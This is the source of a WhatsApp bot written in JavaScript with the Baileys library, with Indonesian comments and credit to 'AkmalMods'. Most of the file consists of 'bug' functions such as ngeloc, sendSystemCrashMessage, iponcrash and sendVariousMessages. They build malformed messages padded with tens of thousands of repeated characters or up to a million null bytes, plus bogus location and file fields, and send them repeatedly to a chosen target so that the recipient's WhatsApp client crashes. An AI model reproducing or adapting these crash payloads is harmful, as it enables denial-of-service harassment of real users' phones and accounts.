/*
                  SCRIPT INI DIBUAT OLEH © AkmalMods 
                  DILARANG KERAS GANTI/MENDELETE CREDIT DIATAS

ERROR?HARAP CHAT GW NOMOR DIBAWAH INI
https://t.me/OwnModss

JANGAN LUPA BANTU JOIN SALURAN GW
https://t.me/Murmerajabg

YOUTUBE ME : https://youtube.com/@AkmalMods



*/

module.exports = async (rezzx, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[Â°zZ#$@+,.?=''():âˆš%!Â¢Â£Â¥â‚¬Ï€Â¤Î Î¦&><`â„¢Â©Â®Î”^Î²Î±Â¦|/\\Â©^]/.test(body) ? body.match(/^[Â°zZ#$@+,.?=''():âˆš%Â¢Â£Â¥â‚¬Ï€Â¤Î Î¦&><!`â„¢Â©Â®Î”^Î²Î±Â¦|/\\Â©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await rezzx.decodeJid(rezzx.user.id)
const sender = m.key.fromMe ? (rezzx.user.id.split(':')[0]+'@s.whatsapp.net' || rezzx.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await rezzx.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { mediafireDl } = require('./all/database/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🌌'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌅'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌆'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🏙️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌇„'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌉'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }

// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const rzvimage = fs.readFileSync('./rzv/rezzv.jpg')
const virgam = fs.readFileSync('./rzv/virgam.png')
const slayer07 = fs.readFileSync('./rzv/slayer07.jpg')
const bugthumb = fs.readFileSync ('./rzv/anu.jpg')

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// Jangan Di Edit Tar Error Di edit? yaudah Error kapok
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await rezzx.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await rezzx.getName(i + '@s.whatsapp.net')}\n
FN:${await rezzx.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:rezzx@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://heylink.me/rezzx-website
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await rezzx.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
rezzx.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
rezzx.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "WhatsApp Crash", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://telegra.ph/file/e4aa7a08ff35950a80c76.jpg", 
"sourceUrl": "https://youtube.com/@rezzxajakali" }}}, { quoted: m }) }

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

// Function Bug

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": rzvimage
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `⭐ REZZX VIRUS ⭐`
}
}
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    rezzx.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "⭐ ∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ⭐",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b9e707fbbbea9277c9a0e.jpg" } }, { upload: rezzx.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "VX ∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹" + "\0".repeat(920000),
      'footerText': "∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹",
      'description': "∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌'+"ꦾ".repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'REZZX IN FOR FAMAOUS', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  rezzx.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌' + 'ê¦¾'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`
}
}
}

async function iponcrash(target) {
await rezzx.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rezzx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await rezzx.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

async function bughomebutton(jid) {
var etc = generateWAMessageFromContent(jid, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "AKMAL MODS"
    },
    "footer": {
      "text": "›AKMAL MODS"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'AKMAL MODS', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await rezzx.relayMessage(jid, etc.message, { messageId: etc.key.id })
}

async function sendBugIos(jid) {
iponcrash(jid)
sleep(500)
sendExtendedTextMessage(jid)
}

//batas bug

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `⚡ WhatsApp Crash ⚡`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;rezzxx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/30286b88d6eba96af4e98.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
rezzx.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
rezzx.groupParticipantsUpdate(m.chat, [sender], 'remove')
rezzx.sendMessage(m.chat, { delete: m.key })
}
}

//MENU MENU LIST PELER

switch (command) {
case 'rezzx': case 'allmenu': case 'menu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU REZZX ✨ ⌋ ✵
│⌲ ${global.rezzx1} BUG MENU 🔥
│⌲ ${global.rezzx2} PANEL MENU 📡
│⌲ ${global.rezzx3} TQTO 💘
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


